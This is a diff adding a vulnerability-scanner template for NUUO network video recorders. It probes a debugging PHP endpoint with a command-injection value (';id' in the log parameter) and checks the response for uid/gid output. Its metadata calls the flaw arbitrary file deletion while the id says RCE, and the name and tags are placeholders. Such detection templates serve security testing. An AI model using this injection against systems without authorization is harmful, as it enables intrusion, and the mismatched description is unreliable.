@@ -1,0 +1,19 @@
+id: NUUO-camera-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: NUUO camera is a network video recorder owned by NUUO in Taiwan, China. The nuuo camera has an arbitrary file deletion vulnerability and can delete any file on the server.
+  reference:
+    - https://github.com/h0e4a0r1t/h0e4a0r1t.github.io/blob/d0b5da484bfcf5af7e1a9889cd90eea4dc5b0ae8/2024/vulns/Arbitrary%20file%20deletion%20vulnerability%20exists%20in%20nuuo%20camera-deletefile.php.pdf
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__debugging_center_utils___.php?log=;id"
+      
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
